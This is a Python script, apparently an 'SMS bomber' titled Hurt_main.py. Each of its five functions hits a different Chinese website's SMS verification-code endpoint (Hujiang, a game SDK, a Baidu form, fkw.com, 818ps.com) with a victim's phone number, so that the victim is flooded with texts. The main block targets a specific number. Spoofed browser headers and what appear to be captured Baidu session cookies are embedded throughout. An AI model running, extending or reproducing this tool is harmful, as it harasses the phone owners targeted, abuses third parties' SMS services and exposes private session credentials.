# -*- coding:utf-8 -*-
# @time     : 2022-07-18 10:56:24
# @File     : Hurt_main.py
# @Author   : Twoyear
import requests
import json


# 沪江
def hu_jiang(phone):
    url = "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile={}&imgcode=&sendtype=quicklogin&hpquid=q22-1imZO-40&user_domain=hj&sub_user_domain=&business_domain=yyy_class&callback=cb6b14cc".format(
        str(phone))
    payload = {}
    headers = {
        'authority': 'pass.hujiang.com',
        'accept': '*/*',
        'accept-language': 'zh-CN,zh;q=0.9',
        'cache-control': 'no-cache',
        'cookie': 'acw_tc=76b20f6216581128735942116e6053c88fd664ffcc7d19c766e639d4e4104e',
        'pragma': 'no-cache',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'script',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
    }

    requests.request("GET", url, headers=headers, data=payload)


# sh9130
def sh_hurt(phone):
    url = "https://sdk.gz9130.com/user/?ac=sendSmsCode&phone={}&type=phoneLogin&sdk_ver=5&uid=&game_id=696&game_pkg=platform_game_A&partner_id=0&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=".format(
        phone)
    payload = {}
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://sh9130.com/',
        'Sec-Fetch-Dest': 'script',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"'
    }

    requests.request("GET", url, headers=headers, data=payload)


# 天鹅到家
def tian_e(phone):
    url = "https://jzapi.baidu.com/rest/form/c/sessions/6ddc00b4c03a493896bd4c10fab3684d/verifications?reqid=4b534c47-cec0-42e0-c592-165811350975"

    payload = json.dumps({
        "action": {
            "show_type": 0,
            "action_prod": 2,
            "user_id": 25619443,
            "tuoguan_page_id": 101722311,
            "tuoguan_site_id": 60498173,
            "tuoguan_app_id": 269,
            "tuoguan_pv_id": "165811342664919478768",
            "exp_ids": "90940-3_90217-1_86205-3_86268-1_55294-1_89002-2_90767-2_62230-1_79636-1_91051-dz_87458-dz_73350-1_83885-3_84510-dz_90328-2_89343-1_88619-1_88940-1_ab_wildcard_dyn-2",
            "page_url": "https://aisite.wejianzhan.com/site/wjzifulr/61aec312-9ee3-446b-90b4-39be86fc7ef3?showpageinpc=1&timestamp=1658113425893&dynType=8&dynId=product.4067284,4067273&dynIgnoredWidget=product&fid=nHDdnHRvnHcknjTzPHnkPH6snHFxnWcdg1D&ch=4&ch=4&bd_vid=nHDdnHRvnHcknjTzPHnkPH6snHFxnWcdg17xnH0sg1wxPjcYn1DLP1msnWn&bd_bxst=EiaKxK0j0jr_14O900DD055o96AtzfSA060000WneQU_VTatYbTjGh000000cbParHc4n1NKwDRknbm4rjnzfbN7PDD3fH6LP1NKwWFAxj06PbmLfWnzfWNjfRfdn1PjrHmLnRFDwRmdPHmYP1TswDrya1_7eWQhQsD0000g9iZ9af000QV2TNwp00000fKO0fWneQU_VUvtY9lk_UlGcPgiEPQNOoxS1EZAETzCQPA91rzveQyqEPc00QqItwc",
            "abtest_url": "",
            "use_history_info": True
        },
        "main_phone": phone,
        "_embedded": {
            "session": {
                "version": -1,
                "solution_id": 14795231,
                "scene_code": "wwpxee",
                "user_id": 25619443
            }
        },
        "verification": {
            "type": "sms"
        }
    })
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Cookie': 'BDUSS_BFESS=d6dC1Mbn5TNU9vN0wyNi1kSGp-V0sxYnRLSElzUVJoRHE0MW1HN1YwdmV0ZmhpRVFBQUFBJCQAAAAAAAAAAAEAAABHA6Zgx-m-w-zhsrvA6wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAN4o0WLeKNFiNm; ab_sr=1.0.1_MzI3ZGZjY2EyNWE4MThkYTg0YjRjYWZhNzgyZmIzZWM2MzkxNGMwZTUwMzk1YmZmYzU1NGNlM2VjZmY2ZGJiYTFmNWM0MWFjOTMzODgyOGU4ZDMyNGE1ZWY5ZTkwYzk3YzM0NDQzNzhmZWJiZWU1ODMwMWYxOWI0NTU3ODZkODAwYTAxMWI5N2E4NGU4MjA0OWVmODFlYjcyMzgyNTVjNDA2MDEwMTI1NzdhYmE2NTJmMTRhMTkyNWFmNWEzNzAw; ZFY=K:BxKdqki9wv:B9ILtK3sVJOXViBdaWedTWOfKcgIQJGk:C; BAIDUID_BFESS=6F7B32B5CAD533C9671BDEF5564770DC:SL=0:NR=10:FG=1; BCLID_BFESS=11477485112946141219; BDSFRCVID_BFESS=YouOJeC62xObMcnDcLsJhFr7D18X177TH6aoD0sZTLTLv4KIuTZXEG0P2U8g0K4b1czLogKK0mOTHUFF_2uxOjjg8UtVJeC6EG0Ptf8g0f5; H_BDCLCKID_SF_BFESS=tJPf_D0MJCD3fP36q47q5-_eDH0DetJyaR3iXRvvWJ5WqR7jD5jTQjtv-Pvp54vl-JvR0n3kW4QoShbXKxocMh3XDab-B4TvLNcM-CTe3l02V-bHy-8a2CuV-RQ2QPRMW20jWl7mWU5PsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjjCMD5j3eH-fq6nfb5kXXnCEab4_HnurBTJzXUI8LNDHaROU-eAqKnO1Qqbss4_6Q-J5Q5OWjnO7ttoyKmjdBJ3O3f3iSl6p-J5zQxL1Db3rW6vMtg3t2ComLU7oepvoD-cc3MkAQ4jdJJQOBKQB0KnGbUQkeq8CQft20b0EeMtjKjLEtJPf_D0MJCD3fP36q47q5-_eDH0DetJyaR3BM56vWJ5WqR7jD5jTQjtv-PvptPvl-JvR0n3kW4QoShbXKxocMh3XDab-B4TvLNcM-CTe3l02V-bHy-8a2CuV-RQ2QPRMW20jWl7mWU5PsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjjCKj5bBjN0tJ6na--oa3RTeb6rjDnCrQPRUXUI82h5y058q02IeKnO1Qtcss4_6Q-OJXxFBhnORXRj4B5vvbPOMthRnOlRKbp_BbML1Db3J0xvbt6LL3JolKMJoepvoD-cc3MkAQ4jdJJQOBKQB0KnGbUQkeq8CQft20b0EeMtjW6LEtJIqoCI2JI83HJTRMJOqqR-8MxrK2JT3KC_X3b7EfMTofq7_bf--DRkg-4c22f32BT7ZBpQ-Jh-abMPljTJxy5K_hP8jbhTnBNnrLDbcW45xoxnHQT3mDlQbbN3itPDDK5QrWb3cWKJV8UbS3fjPBTD02-nBat-OQ6npaJ5nJq5nhMJmb67JD-50exbH55uqJnC8_xK',
        'Origin': 'https://aisite.wejianzhan.com',
        'Pragma': 'no-cache',
        'Referer': 'https://aisite.wejianzhan.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'X-Fengming-Consumer-Code': 'xcqexa',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"'
    }

    requests.request("POST", url, headers=headers, data=payload)


# 凡科网
def fanko(phone):
    url = "https://i.fkw.com/ajax/reg_h.jsp?cmd=sendValidateCode_new&bizType=7"

    payload = "cacct={}&acctType=1&isResend=false&isNewSms=true&cacctCode=O7Ff52qB2HKm5tLm4jg55tR40tn%2F5S4p6dXy4dON8%2BrJ5GNx6E864%2Ffv8ez35%2BIc44IM4ybl9Zzs5A%2Fn1y5u4plF9S%2FVrptY%2BtiEcseCkVS2e5chRs8sPKaITqhVt8KiAbHrCQwsyn1YxJ%2FZi2XaQGVdhjACwz%2FjdRm1Z8qRVrU%3D&isMailAcct=false&checkSign=&vc_type=2&isAdSms=false&retryCount=0".format(
        phone)
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://i.fkw.com',
        'Pragma': 'no-cache',
        'Referer': 'https://i.fkw.com/fkReg.jsp?bizType=7&bdHome=1&proNum=pro1.html',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"'
    }

    requests.request("POST", url, headers=headers, data=payload)


# 图怪兽
def tuguai(phone):
    url = 'https://818ps.com/site-api/send-tel-login-code?num={}&codeImg=undefined'.format(phone)
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'BDUSS_BFESS=d6dC1Mbn5TNU9vN0wyNi1kSGp-V0sxYnRLSElzUVJoRHE0MW1HN1YwdmV0ZmhpRVFBQUFBJCQAAAAAAAAAAAEAAABHA6Zgx-m-w-zhsrvA6wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAN4o0WLeKNFiNm; ab_sr=1.0.1_MzI3ZGZjY2EyNWE4MThkYTg0YjRjYWZhNzgyZmIzZWM2MzkxNGMwZTUwMzk1YmZmYzU1NGNlM2VjZmY2ZGJiYTFmNWM0MWFjOTMzODgyOGU4ZDMyNGE1ZWY5ZTkwYzk3YzM0NDQzNzhmZWJiZWU1ODMwMWYxOWI0NTU3ODZkODAwYTAxMWI5N2E4NGU4MjA0OWVmODFlYjcyMzgyNTVjNDA2MDEwMTI1NzdhYmE2NTJmMTRhMTkyNWFmNWEzNzAw; ZFY=K:BxKdqki9wv:B9ILtK3sVJOXViBdaWedTWOfKcgIQJGk:C; BAIDUID_BFESS=6F7B32B5CAD533C9671BDEF5564770DC:SL=0:NR=10:FG=1; BCLID_BFESS=11477485112946141219; BDSFRCVID_BFESS=YouOJeC62xObMcnDcLsJhFr7D18X177TH6aoD0sZTLTLv4KIuTZXEG0P2U8g0K4b1czLogKK0mOTHUFF_2uxOjjg8UtVJeC6EG0Ptf8g0f5; H_BDCLCKID_SF_BFESS=tJPf_D0MJCD3fP36q47q5-_eDH0DetJyaR3iXRvvWJ5WqR7jD5jTQjtv-Pvp54vl-JvR0n3kW4QoShbXKxocMh3XDab-B4TvLNcM-CTe3l02V-bHy-8a2CuV-RQ2QPRMW20jWl7mWU5PsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjjCMD5j3eH-fq6nfb5kXXnCEab4_HnurBTJzXUI8LNDHaROU-eAqKnO1Qqbss4_6Q-J5Q5OWjnO7ttoyKmjdBJ3O3f3iSl6p-J5zQxL1Db3rW6vMtg3t2ComLU7oepvoD-cc3MkAQ4jdJJQOBKQB0KnGbUQkeq8CQft20b0EeMtjKjLEtJPf_D0MJCD3fP36q47q5-_eDH0DetJyaR3BM56vWJ5WqR7jD5jTQjtv-PvptPvl-JvR0n3kW4QoShbXKxocMh3XDab-B4TvLNcM-CTe3l02V-bHy-8a2CuV-RQ2QPRMW20jWl7mWU5PsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjjCKj5bBjN0tJ6na--oa3RTeb6rjDnCrQPRUXUI82h5y058q02IeKnO1Qtcss4_6Q-OJXxFBhnORXRj4B5vvbPOMthRnOlRKbp_BbML1Db3J0xvbt6LL3JolKMJoepvoD-cc3MkAQ4jdJJQOBKQB0KnGbUQkeq8CQft20b0EeMtjW6LEtJIqoCI2JI83HJTRMJOqqR-8MxrK2JT3KC_X3b7EfMTofq7_bf--DRkg-4c22f32BT7ZBpQ-Jh-abMPljTJxy5K_hP8jbhTnBNnrLDbcW45xoxnHQT3mDlQbbN3itPDDK5QrWb3cWKJV8UbS3fjPBTD02-nBat-OQ6npaJ5nJq5nhMJmb67JD-50exbH55uqJnC8_xK',
        # 'Origin': 'https://aisite.wejianzhan.com',
        'Pragma': 'no-cache',
        # 'Referer': 'https://aisite.wejianzhan.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'X-Fengming-Consumer-Code': 'xcqexa',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"'
    }
    requests.request("GET", url, headers=headers)

if __name__ == '__main__':
    tuguai(13146280806)
